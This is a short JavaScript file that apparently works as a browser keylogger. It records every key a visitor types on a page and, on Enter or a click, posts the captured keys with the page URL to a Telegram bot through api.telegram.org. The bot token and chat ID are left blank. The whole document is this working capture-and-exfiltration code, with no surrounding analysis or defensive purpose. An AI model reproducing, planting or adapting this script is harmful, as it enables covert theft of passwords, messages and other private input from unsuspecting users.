
(function() {
    const chatId = '';
    const token = '';
    const webhook = `https://api.telegram.org/bot${token}/sendMessage`;
    let data = []

    window.addEventListener('keypress', e => {
        data.push(e.key)
        if (e.key === 'Enter' && data.length !== 0) {
            send('**URL**: `' + document.URL.substring(0, Math.max(document.URL.length, 20)) + '`\n' + JSON.stringify(data.slice(data.length - Math.max(data.length, 250))))
            data = []
        }
    })

    window.addEventListener('click', e => {
        if (data.length === 0) return
        send('**URL**: `' + document.URL.substring(0, Math.max(document.URL.length, 20)) + '`\n' + JSON.stringify(data.slice(data.length - Math.max(data.length, 250))))
        data = []
    })

    function send(text) {
        const request = new XMLHttpRequest()
        request.open('POST', webhook)
        request.setRequestHeader('Content-type', 'application/json')
        const params = {
            chat_id: chatId,
            text: text,
            parse_mode: 'Markdown'
        }
        request.send(JSON.stringify(params))
    }
})();
